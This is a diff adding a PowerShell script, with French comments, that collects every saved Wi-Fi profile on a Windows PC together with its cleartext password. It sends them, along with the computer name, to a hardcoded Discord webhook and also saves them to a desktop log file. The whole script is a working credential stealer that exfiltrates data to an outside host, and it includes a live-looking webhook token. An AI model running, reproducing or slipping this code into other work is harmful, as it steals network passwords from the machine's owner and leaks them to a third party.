@@ -1,0 +1,45 @@
+# Obtenir le nom du PC local
+$pcName = $env:COMPUTERNAME
+
+# Obtenir les profils Wi-Fi
+$profiles = netsh wlan show profiles | Select-String ":\s(.+)$"
+
+# Initialiser une liste pour stocker les résultats
+$results = @()
+
+foreach ($profile in $profiles) {
+    $name = $profile.Matches.Groups[1].Value.Trim()
+
+    # Obtenir les détails du profil Wi-Fi, y compris la clé
+    $profileDetails = netsh wlan show profile name="$name" key=clear
+
+    # Rechercher le contenu de la clé (mot de passe)
+    $keyContent = $profileDetails | Select-String "Contenu de la clé\W+\:\s(.+)$"
+
+    if ($keyContent) {
+        $pass = $keyContent.Matches.Groups[1].Value.Trim()
+        
+        # Ajouter les résultats à la liste
+        $results += [PSCustomObject]@{
+            PROFILE_NAME = $name
+            PASSWORD = $pass
+        }
+    }
+}
+
+# Convertir les résultats en format JSON pour l'envoi au webhook
+$jsonResults = $results | ConvertTo-Json -Depth 2
+
+# URL de votre webhook Discord
+$webhookUrl = "https://discord.com/api/webhooks/1244988285101801532/2gT9NpiOuMyELp5791kvlBzuGtKpDiDRzdUZYWh0VsTGUotThz44Tt8SxQzOmk2ddnHM"
+
+# Créer le corps de la requête JSON
+$body = @{
+    content = "Liste des mots de passe Wi-Fi sur ${pcName}:`n`n${jsonResults}"
+} | ConvertTo-Json
+
+# Envoyer la requête au webhook Discord
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+
+# Afficher les résultats dans un tableau et les enregistrer dans un fichier
+$results | Format-Table -AutoSize | Out-File "$env:USERPROFILE\Desktop\Log.txt"
